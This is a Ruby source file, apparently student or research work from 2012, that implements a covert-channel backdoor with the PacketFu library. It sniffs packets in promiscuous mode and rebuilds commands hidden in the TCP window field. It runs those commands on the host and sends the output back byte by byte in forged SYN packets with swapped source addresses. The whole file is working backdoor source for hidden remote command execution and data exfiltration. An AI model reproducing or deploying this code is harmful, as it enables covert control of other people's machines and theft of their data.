#!/usr/bin/env ruby

# Require file
require 'csv'
require 'rubygems'
require 'packetfu'

# Local files
curdir = File.dirname(__FILE__);
require curdir + '/commands.rb'

#-------------------------------------------------------------------------------
# Backdoor
#
# Author: Karl Castillo
#
# Date: November 20, 2012
#
# Notes:
# Backdoor Class that sniffs and sends data to the client.
#-------------------------------------------------------------------------------
class Backdoor
    include Commands
    @start = false
    @command = ""
    
    #---------------------------------------------------------------------------
    # initialize
    #
    # Author: Karl Castillo
    #
    # Date: November 20, 2012
    #
    # Arguments:
    # start - determines whether the sniffing must be started or not (default: false)
    #
    # Notes:
    # Initializes the Backdoor class. This is where all the necessary arguments
    # are collected.
    #---------------------------------------------------------------------------
    def initialize(start = false)
        conf_array = CSV.read("config.csv")
        @conf_array = conf_array[0]
        @iface = @conf_array[0]
        @cfg = PacketFu::Utils.whoami?(:iface=>@iface)
        
        if start then
            listen
        end # start
    end # initalize
    
    #---------------------------------------------------------------------------
    # listen
    #
    # Author: Karl Castillo
    #
    # Date: November 20, 2012
    #
    # Notes:
    # Starts listening for victim packets.
    #---------------------------------------------------------------------------
    def listen
        if @start then
            puts "Backdoor already running"
        else # start
            @start = true
        end # start else
    
        cap = PacketFu::Capture.new(:iface => @iface, :start => true,
                :promisc => true, :filter => @conf_array[1])
        
        #-----------------------------------------------------------------------
        # Capture Packets
        #-----------------------------------------------------------------------
        cap.stream.each do |pkt|
            if PacketFu::TCPPacket.can_parse?(pkt) then
                packet = PacketFu::Packet.parse(pkt)
                process_packet(packet)
            end # can_parse? 
        end # cap
    end # listen
    
    #---------------------------------------------------------------------------
    # process_packet
    #
    # Author: Karl Castillo
    #
    # Date: November 20, 2012
    #
    # Arguments:
    # packet - the packet received
    #
    # Notes:
    # Processes packets, determines whether or not it's the last packet or part
    # of the command
    #---------------------------------------------------------------------------
    def process_packet(packet)
        # Run Generic Command
        if packet.tcp_dst == @conf_array[2].to_i
            if packet.tcp_flags.fin == 1 then
                cmd = @command.split(' ')
                if cmd[0] == "get" then
                    if cmd[1] == "locate" then
                        send_data(get_locate_command(cmd[2]), packet)
                    else # cmd[1]
                        send_data(get_command(cmd[1]), packet)
                    end # cmd[1] else
                else # cmd[0]
                    puts @command
                    send_data(run_command(@command), packet)
                end # cmd[0] else
                @command = ""
            else # fin
                if @command.nil? then
                    @command = packet.tcp_win.chr
                elsif # nil?
                    @command << packet.tcp_win.chr
                end # nil? else
            end # fin else
        end # tcp_dst
    end # process_packet
    
    #---------------------------------------------------------------------------
    # send_data
    #
    # Author: Karl Castillo
    #
    # Date: November 20, 2012
    #
    # Arguments:
    # data - the data that will be sent covertly
    # packet - the packet received where necessary fields will be extracted from
    #
    # Notes:
    # Sends data to the client byte-by-byte and the fin packets to signify
    # the end of the response.
    #---------------------------------------------------------------------------
    def send_data(data, packet)
        #-----------------------------------------------------------------------
        # Send Data Byte-by-Byte
        #-----------------------------------------------------------------------      
        data.each_byte do |word|
            tcp = PacketFu::TCPPacket.new()
            
            tcp.eth_saddr = @cfg[:eth_saddr]
            tcp.tcp_src = rand(0xfff - 1024) + 1024
            tcp.tcp_dst = @conf_array[3].to_i
            tcp.tcp_flags.syn = 1
            tcp.tcp_win = word
            tcp.tcp_seq = rand(0xffff)
            tcp.ip_saddr = packet.ip_daddr
            tcp.ip_daddr = packet.ip_saddr
            
            tcp.recalc
            tcp.to_w(@iface)
        end # each_byte
        
        #-----------------------------------------------------------------------
        # Send Data Byte-by-Byte
        #-----------------------------------------------------------------------  
        tcp_fin = PacketFu::TCPPacket.new()
        
        tcp_fin.eth_saddr = @cfg[:eth_saddr]
        tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
        tcp_fin.tcp_dst = @conf_array[3].to_i
        tcp_fin.tcp_flags.fin = 1
        tcp_fin.tcp_seq = rand(0xffff)
        tcp_fin.ip_saddr = packet.ip_daddr
        tcp_fin.ip_daddr = packet.ip_saddr
        
        tcp_fin.recalc
        tcp_fin.to_w(@iface)
    end # send_data
end # Backdoor
